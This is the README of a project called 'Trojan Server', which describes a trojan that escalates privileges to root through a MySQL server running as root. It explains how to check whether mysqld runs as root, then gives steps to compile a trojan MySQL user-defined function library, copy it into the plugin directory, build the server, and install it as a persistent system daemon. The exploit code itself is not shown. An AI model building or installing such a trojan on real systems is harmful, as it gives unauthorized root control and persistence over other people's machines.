# Trojan Server

© Haobin Chen

This project contains a trojan program that can escalate its privilege to root if the system has MySQL installed and run as `root`. You could check the permission by the following command:

```shell
$ ps -ef | grep mysql
```

The expected output should be

```txt
root      7932     1  0 21:15 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

not 

```txt
mysql      1055     1  0 14:09 ?        00:00:00 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

This can be configured in the file `/etc/mysql/mysql.conf.d/mysqld.cnf`.

## Usage

1. Install gRPC and its thrid party modules. This can be found at [here](https://github.com/grpc/grpc).

2. Install spdlog via source code. This can be found at [here](https://github.com/gabime/spdlog).

3. Install the MySQL connector driver via package manager:

```shell
$ sudo apt install -y libmysqlcppconn-dev
```

4. Compile the MySQL user defined function and move it to the plugin directory.

```shell
$ g++ -o ../lib_trojan_udfs.so -shared -fPIC -std=c++17 udf.cc -I/usr/include/mysql
$ cp ../lib_trojan_udfs.so <path/to/mysql/plugin>
```

5. Make the project:

```shell
$ mkdir build && cd build
$ cmake .. -DCMAKE_BUILD_TYPE=RELEASE
$ make -j
```

6. Install the server as system daemon:

```shell
$ ./bin/installer --port [mysql-port] --file_path=./bin/server --service_path=../service/trojan_server.service
```